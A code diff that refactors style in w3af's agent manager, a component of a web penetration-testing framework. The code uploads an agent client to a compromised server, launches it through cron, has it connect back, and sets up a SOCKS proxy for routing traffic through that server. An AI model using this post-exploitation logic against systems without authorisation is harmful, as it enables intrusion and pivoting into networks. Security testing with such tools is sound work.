@@ -60,7 +60,7 @@ class w3afAgentManager(Process):
         """
         A wrapper for executing commands
         """
-        om.out.debug('Executing: ' + command)
+        om.out.debug(f'Executing: {command}')
         response = apply(self._exec_method, (command,))
         om.out.debug('"' + command + '" returned: ' + response)
         return response
@@ -107,48 +107,46 @@ class w3afAgentManager(Process):
 
                 if not transferHandler.can_transfer():
                     raise BaseFrameworkException('Can\'t transfer w3afAgent client to remote host, can_transfer() returned False.')
-                else:
-                    #    Let the user know how much time it will take to transfer the file
-                    estimatedTime = transferHandler.estimate_transfer_time(
-                        len(client_code))
-                    om.out.debug('The w3afAgent client transfer will take "' +
-                                 str(estimatedTime) + '" seconds.')
+                #    Let the user know how much time it will take to transfer the file
+                estimatedTime = transferHandler.estimate_transfer_time(
+                    len(client_code))
+                om.out.debug('The w3afAgent client transfer will take "' +
+                             str(estimatedTime) + '" seconds.')
 
-                    filename = get_remote_temp_file(self._exec_method)
-                    filename += '.' + extension
+                filename = get_remote_temp_file(self._exec_method)
+                filename += f'.{extension}'
 
-                    #    Upload the file and check integrity
-                    om.out.console('Starting w3afAgent client upload, remote filename is: "%s" ...' % filename)
+                #    Upload the file and check integrity
+                om.out.console('Starting w3afAgent client upload, remote filename is: "%s" ...' % filename)
 
-                    upload_success = transferHandler.transfer(
-                        client_code, filename)
-                    if not upload_success:
-                        raise BaseFrameworkException('The w3afAgent client failed to upload. Remote file hash does NOT match.')
+                upload_success = transferHandler.transfer(
+                    client_code, filename)
+                if not upload_success:
+                    raise BaseFrameworkException('The w3afAgent client failed to upload. Remote file hash does NOT match.')
 
-                    om.out.console('Finished w3afAgent client upload!')
+                om.out.console('Finished w3afAgent client upload!')
 
                     #    And now start the w3afAgentClient on the remote server using cron / at
-                    self._delayedExecution(interpreter + ' ' + filename + ' ' + self._ip_address + ' ' + str(inbound_port))
+                self._delayedExecution(
+                    f'{interpreter} {filename} {self._ip_address} {str(inbound_port)}'
+                )
+
 
                     #
                     #    This checks if the remote server connected back to the agent_server
                     #
-                    if not agent_server.is_working():
-                        om.out.console('Something went wrong, the w3afAgent client failed to connect back.')
-                    else:
-                        msg = 'A SOCKS proxy is listening on %s:%s' % (
-                            self._ip_address, self._socks_port)
-                        msg += ' , all connections made through this daemon will be routed '
-                        msg += ' through the compromised server. We recommend using the proxychains tool '
-                        msg += ' ("apt-get install proxychains") to route connections through the proxy, the '
-                        msg += ' proxy configuration should look like "socks4    %s     %s"' % (self._ip_address, self._socks_port)
-                        om.out.console(msg)
+                if not agent_server.is_working():
+                    om.out.console('Something went wrong, the w3afAgent client failed to connect back.')
+                else:
+                    msg = f'A SOCKS proxy is listening on {self._ip_address}:{self._socks_port}'
+                    msg += ' , all connections made through this daemon will be routed '
+                    msg += ' through the compromised server. We recommend using the proxychains tool '
+                    msg += ' ("apt-get install proxychains") to route connections through the proxy, the '
+                    msg += ' proxy configuration should look like "socks4    %s     %s"' % (self._ip_address, self._socks_port)
+                    om.out.console(msg)
 
     def is_working(self):
-        if self._agent_server is None:
-            return False
-        else:
-            return self._agent_server.is_working()
+        return False if self._agent_server is None else self._agent_server.is_working()
 
     def _delayedExecution(self, command):
         dexecf = delayedExecutionFactory(self._exec_method)
@@ -164,8 +162,13 @@ class w3afAgentManager(Process):
             om.out.debug(
                 '[w3afAgentManager] Crontab entry successfully added.')
             wait_time += 2
-            om.out.information('Please wait ' + str(
-                wait_time) + ' seconds for w3afAgentClient execution.')
+            om.out.information(
+                (
+                    f'Please wait {wait_time}'
+                    + ' seconds for w3afAgentClient execution.'
+                )
+            )
+
             time.sleep(wait_time)
 
             om.out.debug('[w3afAgentManager] Restoring old crontab.')
@@ -183,14 +186,13 @@ class w3afAgentManager(Process):
             client = os.path.join(ROOT_PATH, 'core', 'controllers', 'w3afAgent',
                                   'client', 'w3afAgentClient.py')
             file_content = file(client).read()
-            extension = 'py'
             interpreter = python
         else:
             # TODO: Implement this!
             file_content = ''
-            extension = 'py'
             interpreter = '/usr/bin/python'
 
+        extension = 'py'
         return interpreter, file_content, extension
 
     def _is_locally_available(self, port):
